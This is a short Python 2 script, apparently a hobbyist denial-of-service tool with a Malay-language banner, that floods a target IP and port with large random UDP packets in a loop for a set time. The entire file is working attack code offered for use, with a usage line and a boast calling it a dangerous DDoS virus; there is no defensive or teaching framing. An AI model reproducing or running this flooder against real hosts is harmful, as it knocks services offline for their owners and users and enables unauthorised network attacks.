import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mMagic_Kaito\033[1;32m]---------------------"
    print "#-----------------------------------------------------------"
    print "#\033[1;91mMenjalankan: ""python2 magic.py ""  <ip>  <port> <packet> \033[1;32m"
    print "#\033[1;91mContoh     : ""python2 magic.py ""51.333.222 80  1000 \033[1;32m"
    print "#               \033[1;91m<--[Virus DDOS Attack Berbahaya]-->           \033[1;32m"
    print "\033[1;32m#########################################################"
    print "                     CREATOR:KaitoKID"
    print "                     #WE ARE MALAYSIAN HACKER"
def flood(victim, vport, duration):
    #  Virus Beng Beng Single
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMula \033[1;32m%s \033[1;91mMenhantar Virus BengBeng Single Terkirim \033[1;32m%s \033[1;91mMelalui Port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()
